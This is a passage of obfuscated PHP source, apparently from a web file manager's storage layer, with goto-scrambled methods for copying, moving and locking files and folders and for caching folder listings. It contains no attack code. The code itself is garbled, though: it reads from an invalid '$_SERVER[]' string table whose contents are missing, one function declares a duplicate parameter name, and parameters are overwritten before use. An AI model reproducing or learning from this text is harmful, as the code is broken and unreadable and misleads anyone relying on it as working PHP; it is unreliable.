$_SERVER[]; if (!in_array($C׆΂, $fݸͲ) && $A[$E[397]] != $C׆΂) { return; } $e = explode($E[8], trim($A[$E[513]], $E[8])); goto c⊋Ȅ; c⊋Ȅ: $e = implode($E[8], array_slice($e, 2)); $A[$E[513]] = $E[8] . LNG($E[524]) . $E[8] . ltrim($e, $E[8]); $A[$E[515]] = $E[525] . implode($E[47], array_slice($fݸͲ, 1)) . $E[47]; goto d; DՃ: } protected function _listAppendPathRoot(&$C, $E) { $E󠩅؎ =& $_SERVER[]; $B눒 = $E󠩅؎[33]; if ($C[$E󠩅؎[406]] == self::TYPE_USER) { if (defined($E󠩅؎[468]) && $C[$E󠩅؎[498]] == USER_ID) { $B눒 = LNG($E󠩅؎[528]); if (!$E) { $C[$E󠩅؎[28]] = $B눒; } } else { $fÆ = Model($E󠩅؎[507])->getInfoSimple($C[$E󠩅؎[498]]); $B눒 = LNG($E󠩅؎[529]) . $E󠩅؎[160] . $fÆ[$E󠩅؎[28]] . $E󠩅؎[530]; } } else { if ($C[$E󠩅؎[406]] == self::TYPE_GROUP) { $fÆ = Model($E󠩅؎[516])->getInfoSimple($C[$E󠩅؎[498]]); $B눒 = $fÆ[$E󠩅؎[28]]; } else { if ($C[$E󠩅؎[406]] == self::TYPE_SYSTEM) { $B눒 = $E󠩅؎[531]; } } } $B눒 = $B눒 ? $E󠩅؎[8] . $B눒 . $E󠩅؎[8] : $E󠩅؎[8]; return $B눒; } protected function _listAppendUser(&$cޕ) { goto b; cۃ: unset($D俬ݥ); goto CȾԑ; a׭: $F쿹 = array_merge($d׈, $f); $dʂ = Model($F月[532])->userListInfo($F쿹); foreach ($cޕ as &$D俬ݥ) { $f֝ = $D俬ݥ[$F月[446]]; $D俬ݥ[$F月[446]] = $dʂ[$f֝] ? $dʂ[$f֝] : !1; $f֝ = $D俬ݥ[$F月[448]]; $D俬ݥ[$F月[448]] = $dʂ[$f֝] ? $dʂ[$f֝] : !1; if (isset($D俬ݥ[$F月[459]]) && $D俬ݥ[$F月[459]][$F月[533]]) { $E՘ = $GLOBALS[$F月[6]][$F月[88]][$F月[534]]; if ($D俬ݥ[$F月[459]][$F月[535]] <= time() - $E՘) { $this->metaSet($D俬ݥ[$F月[397]], $F月[533], null); $this->metaSet($D俬ݥ[$F月[397]], $F月[535], null); unset($D俬ݥ[$F月[459]][$F月[533]]); continue; } $dы = $D俬ݥ[$F月[459]][$F月[533]]; $D俬ݥ[$F月[459]][$F月[536]] = Model($F月[532])->getInfoSimpleOuter($dы); } } goto cۃ; b: $F月 =& $_SERVER[]; $d׈ = array_to_keyvalue($cޕ, $F月[33], $F月[446]); $f = array_to_keyvalue($cޕ, $F月[33], $F月[448]); goto a׭; CȾԑ: } public function parentLevelArray($A޵ȧ) { $BА =& $_SERVER[]; $A޵ȧ = explode($BА[47], trim($A޵ȧ, $BА[47])); return array_remove_value($A޵ȧ, $BА[191]); } public function listAll($aĆ) { goto Fق䉈; d輳: $d = array_to_keyvalue($d, $Dż[397]); $a = "\x2f{$F䠊[$Dż[28]]}\x2f"; $a = $a == $Dż[523] ? $Dż[8] : $a; goto aʍŷ; E٤: $this->_listAppendAuth($d); $this->_listAppendUser($d); $this->_listAppendPath($d); goto d輳; aʍŷ: $AǄ = array(); foreach ($d as $eڇ => $Dۺ) { goto F; Aܺ: $e = str_replace($Dż[523], $Dż[8], $e); $e = str_replace($Dż[523], $Dż[8], $e); $c = array($Dż[416] => str_replace($Dż[523], $Dż[8], $e), $Dż[542] => intval($Dۺ[$Dż[405]]), $Dż[85] => $this->pathInfoFilter($Dۺ)); goto d; d: if (!$Dۺ[$Dż[405]]) { $c[$Dż[461]] = $Dۺ[$Dż[461]]; $c[$Dż[86]] = $Dۺ[$Dż[76]]; } $AǄ[] = $c; goto Dڊ; Bǰ뉍: for ($aш = 0; $aш < count($e); $aш++) { $e .= $d[$e[$aш]][$Dż[28]] . $Dż[8]; } $e .= $Dۺ[$Dż[28]]; if ($Dۺ[$Dż[405]]) { $e .= $Dż[8]; } goto Aܺ; F: $e = $this->parentLevelArray($Dۺ[$Dż[515]]); array_shift($e); $e = $a; goto Bǰ뉍; Dڊ: } return $AǄ; goto bё; Fق䉈: $Dż =& $_SERVER[]; $F䠊 = $this->sourceInfo($aĆ); $Bё = array($Dż[537] => array($Dż[538], $F䠊[$Dż[515]] . $aĆ . $Dż[539]), $Dż[540] => 0); goto Cܭ޿; Cܭ޿: $Aݮ = $Dż[541]; $Bʣ = "\114\x45\x46\124\x20\112\117\111\x4e\40{$this->tablePrefix}\x69\157\137\x66\151\x6c\145\x20\x66\151\154\x65\x20\x6f\x6e\x20\163\x6f\165\x72\x63\x65\56\x66\x69\x6c\145\111\104\x20\x3d\40\146\x69\x6c\145\56\146\151\x6c\145\x49\104"; $d = $this->alias($Dż[438])->field($Aݮ)->where($Bё)->join($Bʣ)->select(); goto E٤; bё: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($C) { goto D䛶Щ; D䛶Щ: $F̸Ͻ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($F̸Ͻ[543], $C); goto EĞ; fȪ³: $this->_lockEvent($C, array($F̸Ͻ[546], $F̸Ͻ[547]), $BȤ); $this->_lockCheckEnd($F̸Ͻ[543], $C); goto Cɴࢺ; EĞ: $BȤ = 1; $this->_lockEvent($C, array($F̸Ͻ[544], $F̸Ͻ[545]), $BȤ); $this->_lockParent($C, array($F̸Ͻ[545]), $BȤ); goto fȪ³; Cɴࢺ: } public function lockCopyEnd($a֛͐˲) { $aӐ =& $_SERVER[]; if (!$this->allowLock()) { return; } $e = 0; $this->_lockEvent($a֛͐˲, array($aӐ[544], $aӐ[545]), $e); $this->_lockParent($a֛͐˲, array($aӐ[545]), $e); $this->_lockEvent($a֛͐˲, array($aӐ[546], $aӐ[547]), $e); } public function lockWriteStart($d֭, $eư = '') { goto d; d: $bϧ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($bϧ[544], $d֭); goto a; c: $this->_lockParent($d֭, array($bϧ[543], $bϧ[545]), $FΚ); $this->_lockCheckEnd($bϧ[544], $d֭); goto Aҡ; a: $FΚ = 1; $this->_lockKey($bϧ[548] . $d֭ . $bϧ[95] . $eư, $FΚ); $this->_lockEvent($d֭, array($bϧ[543], $bϧ[545]), $FΚ); goto c; Aҡ: } public function lockWriteEnd($bԪޯ, $Bצ = '') { $d׉Ԃ =& $_SERVER[]; if (!$this->allowLock()) { return; } $c = 0; $this->_lockKey($d׉Ԃ[548] . $bԪޯ . $d׉Ԃ[95] . $Bצ, $c); $this->_lockEvent($bԪޯ, array($d׉Ԃ[543], $d׉Ԃ[545]), $c); $this->_lockParent($bԪޯ, array($d׉Ԃ[543], $d׉Ԃ[545]), $c); } public function lockMoveStart($c) { goto D䅿; a: $f = 1; $this->_lockKey($D٭ܡ[549] . $c, $f); $this->_lockEvent($c, array($D٭ܡ[543], $D٭ܡ[544]), $f); goto E僞ۍ; D䅿: $D٭ܡ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($D٭ܡ[545], $c); goto a; E僞ۍ: $this->_lockParent($c, array($D٭ܡ[543], $D٭ܡ[545]), $f); $this->_lockEvent($c, array($D٭ܡ[550], $D٭ܡ[546], $D٭ܡ[547]), $f); $this->_lockCheckEnd($D٭ܡ[545], $c); goto f; f: } public function lockMoveEnd($D泘) { goto B迬; B迬: $A =& $_SERVER[]; if (!$this->allowLock()) { return; } $aěȚ = 0; goto F; F: $this->_lockKey($A[549] . $D泘, $aěȚ); $this->_lockEvent($D泘, array($A[543], $A[544]), $aěȚ); $this->_lockParent($D泘, array($A[543], $A[545]), $aěȚ); goto B鷘; B鷘: $this->_lockEvent($D泘, array($A[550], $A[546], $A[547]), $aěȚ); goto dЅ; dЅ: } private function _lockCheck($d漒, $B̗) { goto Eʥ; Bͭҏ: $dǎ = array_reverse($this->parentLevelArray($bƷ[$Fȷ[515]])); foreach ($dǎ as $C눯) { $E = $d漒 . $Fȷ[552] . $C눯; if (CacheLock::lockGet($Fȷ[553] . $E)) { $bƷ = $this->sourceInfo($C눯); CacheLock::setErrorMsg($Fȷ[160] . htmlspecialchars($bƷ[$Fȷ[28]]) . $Fȷ[530] . $A); $this->_lockKey($E, 1); $this->_lockKey($E, 0); } } goto cɑ; c㿠ь: CacheLock::setErrorMsg($Fȷ[160] . htmlspecialchars($bƷ[$Fȷ[28]]) . $Fȷ[530] . $A); $this->_lockKey($E, 1); $this->_lockKey($E, 0); goto Bͭҏ; Bȯ: $this->_lockTimeStart[$E] = timeFloat(); if (!is_array($bƷ)) { return; } $A = LNG($Fȷ[551]); goto c㿠ь; Eʥ: $Fȷ =& $_SERVER[]; $bƷ = $this->sourceInfo($B̗); $E = $d漒 . $Fȷ[95] . $B̗; goto Bȯ; cɑ: } private function _lockCheckEnd($D, $D) { goto eۜ; dμ: if ($D猳 > 0.5) { unset(self::$cacheSourceInfo[$Bʗ۟[452] . $D]); } $a֍䥃 = $this->sourceInfo($D); if (!$a֍䥃) { show_json(LNG($Bʗ۟[105]), !1); } goto Aýᤩ; eۜ: $Bʗ۟ =& $_SERVER[]; $fˣ = $D . $Bʗ۟[95] . $D; CacheLock::setErrorMsg($Bʗ۟[376]); goto b; b: if (!isset($this->_lockTimeStart[$fˣ])) { return; } $D猳 = timeFloat() - $this->_lockTimeStart[$fˣ]; unset($this->_lockTimeStart[$fˣ]); goto dμ; Aýᤩ: } private function _lockParent($D֤ҍ, $aȉ, $D㼎) { if (!$this->autoLockSet) { return; } $F = $this->sourceInfo($D֤ҍ); if (!is_array($F)) { return; } $A֊˖ = array_reverse($this->parentLevelArray($F[$_SERVER[][515]])); foreach ($A֊˖ as $fϸ) { $this->_lockEvent($fϸ, $aȉ, $D㼎); } } private function _lockEvent($Fâ, $fӭƹ, $EĪ) { $fΑ̋ =& $_SERVER[]; if (!$this->autoLockSet) { return; } foreach ($fӭƹ as $Bۂ) { $D͘ = $Bۂ . $fΑ̋[95] . $Fâ; if ($EĪ && CacheLock::lockGet($fΑ̋[553] . $D͘)) { continue; } $this->_lockKey($D͘, $EĪ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Bѯ, $E = 1) { $a = $_SERVER[][553] . md5($Bѯ); if ($E) { if (isset(self::$_lockItemArr[$a])) { return; } self::$_lockItemArr[$a] = 1; CacheLock::lock($a, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$a])) { return; } unset(self::$_lockItemArr[$a]); CacheLock::unlock($a); } } public function isParentOf($DՅٳ, $Fɷ) { goto CϾ̻; D: return $a; goto fޠ; A: $eÛ = $dՇּҐ[$BѢ͜[515]] . $dՇּҐ[$BѢ͜[397]] . $BѢ͜[47]; $FЉ = $AҤسۺ[$BѢ͜[515]] . $AҤسۺ[$BѢ͜[397]] . $BѢ͜[47]; $a = strpos($FЉ, $eÛ) === 0; goto D; CϾ̻: $BѢ͜ =& $_SERVER[]; $dՇּҐ = $this->sourceInfo($DՅٳ); $AҤسۺ = $this->sourceInfo($Fɷ); goto A; fޠ: } private $targetIsDelete = 0; public function copy($c, $D㗷, $cȭݟ = REPEAT_REPLACE, $bЪ = '') { goto c唬; cըᛦ: $this->targetIsDelete = intval($E郬[$c[425]]); $C = $this->fileNameExistCache($D㗷, $E郬[$c[28]]); $Cֆ = $this->_copy($c, $D㗷, $cȭݟ, $E޵ʼ, !0, $bЪ); goto A۰; D➈: $this->lockCopyStart($c); $this->lockWriteStart($D㗷, $A˷Ȃ); $E޵ʼ = array($c[554] => array(), $c[555] => array(), $c[556] => array()); goto cըᛦ; dх: $this->saveAll($E޵ʼ[$c[556]]); Model($c[193])->linkAdd($E޵ʼ[$c[554]]); $this->folderSizeReset($D㗷); goto bѩ敩; bƸ: if (!$E郬 || !$Aݽ || $Aݽ[$c[405]] != $c[87]) { return !1; } if ($this->isParentOf($c, $D㗷)) { return !1; } $A˷Ȃ = $bЪ ? $bЪ : $E郬[$c[28]]; goto D➈; B߽: if ($E郬[$c[405]] == $c[87] && $C == $Cֆ) { $this->folderSizeResetChildren($C); } Model($c[557])->addAll($E޵ʼ[$c[555]], array(), !0); if ($C != $Cֆ || $E郬[$c[405]] == $c[87]) { Model($c[558])->eventCopy($Cֆ); } goto dх; bѩ敩: $this->updateModifyTime($D㗷); return $Cֆ; goto b; A۰: $this->_childrenListClear(); $this->lockCopyEnd($c); $this->lockWriteEnd($D㗷, $A˷Ȃ); goto B߽; c唬: $c =& $_SERVER[]; $E郬 = $this->sourceInfo($c); $Aݽ = $this->sourceInfo($D㗷); goto bƸ; b: } private function _copy($cԆ友, $Bʗ, $dÑ, &$d, $Aū, $fέ = '') { goto F滢; Cƹ: return $A砻; goto a䌕; F滢: $Aџ =& $_SERVER[]; $dِ֬ = $this->sourceInfoCache($cԆ友); $D = $dِ֬[$Aџ[405]] == $Aџ[87]; goto cŜ; cŜ: $fᵰ = $fέ ? $fέ : $dِ֬[$Aџ[28]]; $E݉ʐ = $this->fileNameExistCache($Bʗ, $fᵰ); if ($Aū) { $this->_childrenAllMake($cԆ友); if ($D && $E݉ʐ) { $this->_childrenAllMake($E݉ʐ); } } goto D؄; D؄: if (!$E݉ʐ) { return $this->_copyCreate($cԆ友, $Bʗ, $fᵰ, $d); } $A砻 = $E݉ʐ; if ($D) { if ($dÑ == REPEAT_RENAME_FOLDER) { $fᵰ = $this->fileNameAutoCache($Bʗ, $fᵰ, $dÑ, $D); $A砻 = $this->_copyCreate($cԆ友, $Bʗ, $fᵰ, $d); } else { $aո = $this->_childrenList($cԆ友); foreach ($aո as $f) { $this->_copy($f[$Aџ[397]], $E݉ʐ, $dÑ, $d, !1); } } } else { if ($dÑ == REPEAT_RENAME || $dÑ == REPEAT_RENAME_FOLDER) { $fᵰ = $this->fileNameAutoCache($Bʗ, $fᵰ, $dÑ, $D); $A砻 = $this->_copyCreate($cԆ友, $Bʗ, $fᵰ, $d); } else { if ($dÑ == REPEAT_REPLACE) { $FА = $this->sourceInfoCache($E݉ʐ); $b͐ = $this->fileHistory($FА, $dِ֬[$Aџ[461]], $dِ֬[$Aџ[78]]); if ($b͐) { $d[$Aџ[554]][] = $dِ֬[$Aџ[461]]; } } else { if ($dÑ == REPEAT_SKIP) { } } } Hook::trigger($Aџ[559], array($Aџ[560], $dِ֬, 0)); } goto Cƹ; a䌕: } private function _copyCreate($F۞, $BՌ҉, $d۱㜍, &$B䫙) { goto f֑; D̋ެ: if ($C[$c̨[405]] != $c̨[87]) { $B䫙[$c̨[554]][] = $C[$c̨[461]]; return $d켨; } $cܙҍ = array(); $cں = array(); goto d; A: $this->chunkEventSet($c̨[568], array($c̨[569], $aӡ, $E鋃)); $this->saveAll($C); return $d켨; goto D; d: $this->_childrenListAll($F۞, $cܙҍ); $E鋃 = count($cܙҍ); if ($E鋃 == 0) { return $d켨; } goto c; c: $A = $this->sourceInfo($d켨); foreach ($cܙҍ as $B) { $dٲԔ = $this->_makeItemData($B, $A, $B[$c̨[28]]); $dٲԔ[$c̨[515]] = $B[$c̨[515]]; $cں[] = $dٲԔ; } $this->chunkEventSet($c̨[564], array($c̨[565], $aӡ, $E鋃)); goto Eϝ; dޭ: $d켨 = $this->add($aӡ); $EǾ = array($c̨[397] => $d켨, $c̨[28] => $d۱㜍); $this->_copyApplyMeta($EǾ, $B䫙); goto D̋ެ; f֑: $c̨ =& $_SERVER[]; $C = $this->sourceInfoCache($F۞); $bᲹ = $this->sourceInfoCache($BՌ҉); goto B; Eϝ: $this->addAll($cں, array(), !1); $f = $this->where(array($c̨[492] => $d켨))->select(); $EΊ = $this->_childrenMakeRelation($cܙҍ, $f); goto CӃа; CӃа: $EΊ[$F۞] = $d켨; $D⸿ü = array(); $C = array(); goto fź; B: $aӡ = $this->_makeItemData($C, $bᲹ, $d۱㜍); Hook::trigger($c̨[561], $aӡ); Hook::trigger($c̨[562], array($c̨[563], $aӡ, 0)); goto dޭ; fź: foreach ($f as $B) { $CרȎ = $B[$c̨[397]]; $b = $this->_childrenMatch($EΊ, $B, $A); $D⸿ü[] = array($c̨[397], $CרȎ, $c̨[492], $b[$c̨[492]]); $C[] = array($c̨[397], $CרȎ, $c̨[515], $b[$c̨[515]]); $this->_copyApplyMeta($B, $B䫙); if ($B[$c̨[405]] != $c̨[87]) { $B䫙[$c̨[554]][] = $B[$c̨[461]]; } } $this->chunkEventSet($c̨[566], array($c̨[567], $aӡ, $E鋃)); $this->saveAll($D⸿ü); goto A; D: } private function _childrenMakeRelation($A, $C) { $ä́ =& $_SERVER[]; $DߌՊ = array(); $Fٳ = array(); foreach ($A as $a뽊) { $Aߏ = $a뽊[$ä́[28]] . $ä́[8] . $a뽊[$ä́[515]]; $DߌՊ[$Aߏ] = $a뽊[$ä́[397]]; } foreach ($C as $a뽊) { $Aߏ = $a뽊[$ä́[28]] . $ä́[8] . $a뽊[$ä́[515]]; $fٜ = $DߌՊ[$Aߏ]; $Fٳ[$fٜ] = $a뽊[$ä́[397]]; } return $Fٳ; } private function _childrenMatch($AŲ, $BѤٹ, $eϹ) { goto Bݐ; E: foreach ($bƼ܊ as $F) { if (isset($AŲ[$F])) { $Aފ .= $AŲ[$F] . $F[570]; } } $Aފ = rtrim($Aފ, $F[47]) . $F[47]; $Eؙ = $this->parentLevelArray($Aފ); goto BԵ; Bݐ: $F =& $_SERVER[]; $Aފ = $eϹ[$F[515]]; $bƼ܊ = $this->parentLevelArray($BѤٹ[$F[515]]); goto E; BԵ: $eϗȶ = $Eؙ[count($Eؙ) - 1]; return array($F[492] => $eϗȶ, $F[515] => $Aފ); goto aץإ; aץإ: } private function _makeItemData($fϏ, $d, $Eג) { $d桝ɲ =& $_SERVER[]; $F = array($d桝ɲ[571] => $fϏ[$d桝ɲ[405]], $d桝ɲ[415] => $Eג, $d桝ɲ[572] => $fϏ[$d桝ɲ[407]], $d桝ɲ[462] => $fϏ[$d桝ɲ[461]], $d桝ɲ[573] => $fϏ[$d桝ɲ[78]], $d桝ɲ[574] => $d[$d桝ɲ[406]], $d桝ɲ[575] => $d[$d桝ɲ[498]], $d桝ɲ[576] => USER_ID, $d桝ɲ[577] => USER_ID, $d桝ɲ[396] => $d[$d桝ɲ[397]], $d桝ɲ[578] => $d[$d桝ɲ[515]] . $d[$d桝ɲ[397]] . $d桝ɲ[47], $d桝ɲ[419] => $fϏ[$d桝ɲ[84]], $d桝ɲ[424] => 0, $d桝ɲ[579] => $d桝ɲ[33]); return $F; } private function _copyApplyMeta($bʧ, &$b͋) { $B䑄« =& $_SERVER[]; $DÅ = $bʧ[$B䑄«[397]]; $cђω = $bʧ[$B䑄«[28]]; if (!isset($bʧ[$B䑄«[580]]) || !$bʧ[$B䑄«[580]] || $bʧ[$B䑄«[580]] == $B䑄«[191]) { $b͋[$B䑄«[556]][] = array($B䑄«[397], $DÅ, $B䑄«[580], short_id($DÅ)); } if (Input::check($cђω, $B䑄«[581])) { $b͋[$B䑄«[555]][] = array($B䑄«[397] => $DÅ, $B䑄«[93] => $B䑄«[458], $B䑄«[372] => str_replace($B䑄«[50], $B䑄«[33], Pinyin::get($cђω))); $b͋[$B䑄«[555]][] = array($B䑄«[397] => $DÅ, $B䑄«[93] => $B䑄«[457], $B䑄«[372] => Pinyin::get($cђω, $B䑄«[582])); } $b͋[$B䑄«[555]][] = array($B䑄«[397] => $DÅ, $B䑄«[93] => $B䑄«[436], $B䑄«[372] => KodSort::makeStr($cђω)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($C٠) { goto B; b: $aૼ = array($aϭ[515] => array($aϭ[538], $Cߧ[$aϭ[515]] . $C٠ . $aϭ[539]), $aϭ[425] => $this->targetIsDelete); $cӲ׾ = $this->field($d݄)->where($aૼ)->select(); if (!$cӲ׾) { return; } goto C⌸; C⌸: $cӲ׾ = array_to_keyvalue($cӲ׾, $aϭ[397]); foreach ($cӲ׾ as $FՍ䵄) { $Aɱӕ = $FՍ䵄[$aϭ[492]]; $C٠ = $FՍ䵄[$aϭ[397]]; if (!isset($this->_childrenListCache[$C٠]) && $FՍ䵄[$aϭ[405]] == $aϭ[87]) { $this->_childrenListCache[$C٠] = array(); } if (!isset($this->_childrenListCache[$Aɱӕ])) { $this->_childrenListCache[$Aɱӕ] = array(); } $this->_childrenListCache[$Aɱӕ][$C٠] = $FՍ䵄; $this->_childrenItemCache[$C٠] = $FՍ䵄; } goto EԐ; B: $aϭ =& $_SERVER[]; $Cߧ = $this->sourceInfo($C٠); $d݄ = $aϭ[583]; goto b; EԐ: } private function _childrenListAll($f, &$c׺ز) { $f =& $_SERVER[]; if (!isset($this->_childrenListCache[$f])) { return; } $f챿 = $this->_childrenListCache[$f]; foreach ($f챿 as $F滻 => $D߭) { $c׺ز[$F滻] = $D߭; if ($D߭[$f[405]] == $f[87]) { $this->_childrenListAll($F滻, $c׺ز); } } } private function sourceInfoCache($F) { if (isset($this->_childrenItemCache[$F])) { return $this->_childrenItemCache[$F]; } return $this->sourceInfo($F); } private function _childrenList($dݮ) { if (isset($this->_childrenListCache[$dݮ])) { return $this->_childrenListCache[$dݮ]; } return $this->_childrenListSelect($dݮ); } private function _childrenListSelect($B˙駸) { goto EŊҏ; C̓Ϧ: foreach ($f˄׆ as $B˙駸 => $DΎ) { $this->_childrenItemCache[$B˙駸] = $DΎ; } return $f˄׆; goto f; EŊҏ: $b킻忡 =& $_SERVER[]; $D = array($b킻忡[492] => $B˙駸, $b킻忡[425] => $this->targetIsDelete); $EĮꕦ = $this->where($D)->select(); goto B˷Э; B˷Э: $EĮꕦ = $EĮꕦ ? $EĮꕦ : array(); $f˄׆ = array_to_keyvalue($EĮꕦ, $b킻忡[397]); $this->_childrenListCache[$B˙駸] = $f˄׆; goto C̓Ϧ; f: } private function fileNameExistCache($c, $dԇ) { $Aæ =& $_SERVER[]; $dԇ = strtolower($dԇ); $CΘٹ = $this->_childrenList($c); foreach ($CΘٹ as $E׍) { if ($dԇ == strtolower($E׍[$Aæ[28]])) { return $E׍[$Aæ[397]]; } } return !1; } private function fileNameAutoCache($F, $f񍃘, $C鄍ມ, $dʹ) { $B٧ =& $_SERVER[]; $eʆ = $this->_childrenList($F); $fț = array_to_keyvalue($eʆ, $B٧[33], $B٧[28]); return $this->fileNameAutoGet($fț, $f񍃘, $C鄍ມ, $dʹ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($D㸶, $Bܛא, $eՃƮ = REPEAT_REPLACE, $bќ = '') { goto F; b֪: return $Eʳ銜; goto D; E: $this->updateModifyTime($bŋ); Model($eĊԆ[558])->eventMove($D㸶, $e[$eĊԆ[492]], $Bܛא); Hook::trigger($eĊԆ[585], $eĮ); goto b֪; Cփ: $Aǋ = $this->fileNameExistCache($Bܛא, $e[$eĊԆ[28]]); $Eʳ銜 = $this->_move($D㸶, $Bܛא, $eՃƮ, $cȗ, $bќ); $this->sourceCacheClear(); goto eՍ; aԱ: $this->folderSizeReset($Bܛא); $bŋ = array($e[$eĊԆ[492]], $Bܛא); if ($e[$eĊԆ[405]] == $eĊԆ[87]) { $bŋ[] = $D㸶; } goto E; F: $eĊԆ =& $_SERVER[]; $e = $this->sourceInfo($D㸶); $a = $this->sourceInfo($Bܛא); goto cЕ; A䅌: $this->lockWriteStart($Bܛא, $F߱); $cȗ = array($eĊԆ[554] => array(), $eĊԆ[586] => !1); $this->clearShare($D㸶, $Bܛא); goto Cփ; eՍ: if ($e[$eĊԆ[405]] == $eĊԆ[87] && $Aǋ) { $this->folderSizeResetChildren($Eʳ銜); } Model($eĊԆ[193])->linkAdd($cȗ[$eĊԆ[554]]); if ($Aǋ && $cȗ[$eĊԆ[586]]) { $this->removeNow($D㸶, !1); } goto D; cЕ: if ($e[$eĊԆ[492]] == $a[$eĊԆ[397]]) { if ($e[$eĊԆ[425]] == $eĊԆ[87]) { Model($eĊԆ[423])->restore(array($D㸶)); } if (!$bќ || $bќ == $e[$eĊԆ[28]]) { return $D㸶; } } $eĮ = $this->pathInfoMore($D㸶); if ($this->isParentOf($D㸶, $Bܛא)) { return !1; } goto aĞɎ; D: $this->lockMoveEnd($D㸶); $this->lockWriteEnd($Bܛא, $F߱); $this->folderSizeReset($e[$eĊԆ[492]]); goto aԱ; aĞɎ: if (!$e || !$a || $a[$eĊԆ[405]] != $eĊԆ[87]) { return !1; } Hook::trigger($eĊԆ[584], $eĮ); $this->targetIsDelete = intval($e[$eĊԆ[425]]); goto dޗ; dޗ: if ($e[$eĊԆ[492]] == $Bܛא && $bќ != $e[$eĊԆ[28]]) { $a = $this->fileNameExist($Bܛא, $bќ); if ($a && $e[$eĊԆ[405]] == $eĊԆ[191]) { goto c뒅; B֥: return $a; goto Fٲ; f: $this->removeNow($D㸶, !1); $this->folderSizeReset($Bܛא); Hook::trigger($eĊԆ[585], $eĮ); goto B֥; c뒅: $Aꏾ = $this->sourceInfo($a); $f = $this->fileHistory($Aꏾ, $e[$eĊԆ[461]], $e[$eĊԆ[78]]); if (!$f) { Model($eĊԆ[464])->remove($e[$eĊԆ[461]]); } goto f; Fٲ: } } $F߱ = $bќ ? $bќ : $e[$eĊԆ[28]]; $this->lockMoveStart($D㸶); goto A䅌; D: } private function _move($b駞õ, $a޶۩, $f, &$BӸ, $a܏ = '') { goto D; E: $f؂κ = !1; if ($E) { if ($f == REPEAT_RENAME_FOLDER) { $F鵽 = $this->fileNameAuto($a޶۩, $F鵽, $f, $E); $eךˣ = $this->_moveForce($b駞õ, $a޶۩, $F鵽); } else { if ($f == REPEAT_RENAME_FOLDER) { $f = REPEAT_RENAME; } $Fի = $this->_childrenListSelect($b駞õ); foreach ($Fի as $d) { $this->_move($d[$CʓƇ[397]], $b, $f, $BӸ); } $f؂κ = !0; } } else { if ($f == REPEAT_SKIP) { $f؂κ = !0; } else { if ($f == REPEAT_RENAME || $f == REPEAT_RENAME_FOLDER) { $F鵽 = $this->fileNameAuto($a޶۩, $F鵽, $f, $E); $eךˣ = $this->_moveForce($b駞õ, $a޶۩, $F鵽); } else { if ($f == REPEAT_REPLACE) { $CŮի = $this->sourceInfoCache($b); $B = $this->fileHistory($CŮի, $Bݞڛ½[$CʓƇ[461]], $Bݞڛ½[$CʓƇ[78]]); $f؂κ = !0; if ($B) { $BӸ[$CʓƇ[554]][] = $Bݞڛ½[$CʓƇ[461]]; } } } } } if ($f؂κ && !$BӸ[$CʓƇ[586]]) { $BӸ[$CʓƇ[586]] = !0; } goto F; D: $CʓƇ =& $_SERVER[]; $Bݞڛ½ = $this->sourceInfo($b駞õ); $E = $Bݞڛ½[$CʓƇ[405]] == $CʓƇ[87]; goto Aٱק; Aٱק: $F鵽 = $a܏ ? $a܏ : $Bݞڛ½[$CʓƇ[28]]; $b = $this->fileNameExistCache($a޶۩, $F鵽); $this->lockMoveStart($b駞õ); goto C; C: $this->lockWriteStart($a޶۩, $F鵽); if (!$b) { return $this->_moveForce($b駞õ, $a޶۩, $F鵽); } $eךˣ = $b; goto E; F: return $eךˣ; goto b; b: } private function _moveForce($f, $d, $E) { goto dԹ; fȤ: if ($B) { $dˇ = array($eՈ꜎[578] => array($eՈ꜎[538], $Cߛ[$eՈ꜎[515]] . $Cߛ[$eՈ꜎[397]] . $eՈ꜎[539])); $DЦ = $Cߛ[$eՈ꜎[515]] . $Cߛ[$eՈ꜎[397]] . $eՈ꜎[47]; $d = $A[$eՈ꜎[515]] . $A[$eՈ꜎[397]] . $eՈ꜎[47] . $Cߛ[$eՈ꜎[397]] . $eՈ꜎[47]; $b磾 = array($eՈ꜎[578] => array($eՈ꜎[587], "\162\145\x70\x6c\x61\143\x65\x28\160\x61\x72\145\x6e\x74\x4c\145\x76\x65\x6c\54\47{$DЦ}\47\x2c\47{$d}\47\x29"), $eՈ꜎[574] => $A[$eՈ꜎[406]], $eՈ꜎[575] => $A[$eՈ꜎[498]]); if ($B) { $b磾[$eՈ꜎[424]] = 0; } $this->where($dˇ)->data($b磾)->save(); } $this->where(array($eՈ꜎[412] => $f))->data($e)->save(); return $f; goto f稤; dԹ: $eՈ꜎ =& $_SERVER[]; $Cߛ = $this->sourceInfo($f); $A = $this->sourceInfo($d); goto fݽ; aꑊ: if (!$C && $this->moveClearAuth) { Model($eՈ꜎[496])->authClear($f); } $B = $Cߛ[$eՈ꜎[425]] == $eՈ꜎[87] && $A[$eՈ꜎[425]] != $eՈ꜎[87]; if ($B) { $e[$eՈ꜎[424]] = 0; } goto fȤ; fݽ: $B = $Cߛ[$eՈ꜎[405]] == $eՈ꜎[87]; $e = array($eՈ꜎[396] => $A[$eՈ꜎[397]], $eՈ꜎[578] => $A[$eՈ꜎[515]] . $A[$eՈ꜎[397]] . $eՈ꜎[47], $eՈ꜎[574] => $A[$eՈ꜎[406]], $eՈ꜎[575] => $A[$eՈ꜎[498]], $eՈ꜎[577] => USER_ID, $eՈ꜎[415] => $E); $C = $Cߛ[$eՈ꜎[406]] == SourceModel::TYPE_GROUP && $A[$eՈ꜎[406]] == SourceModel::TYPE_GROUP && $Cߛ[$eՈ꜎[498]] == $A[$eՈ꜎[498]]; goto aꑊ; f稤: } private function clearShare($a溼е, $Dɐ) { goto Dٌ; Dٌ: $b =& $_SERVER[]; $D󾖧 = $this->sourceInfo($a溼е); $Fވ = $this->sourceInfo($Dɐ); goto d; E͋턺: if (!$C) { return; } $C = array_to_keyvalue($C, $b[33], $b[482]); $b = array($b[482] => array($b[7], $C)); goto D; D: Model($b[589])->where($b)->save(array($b[489] => 0)); 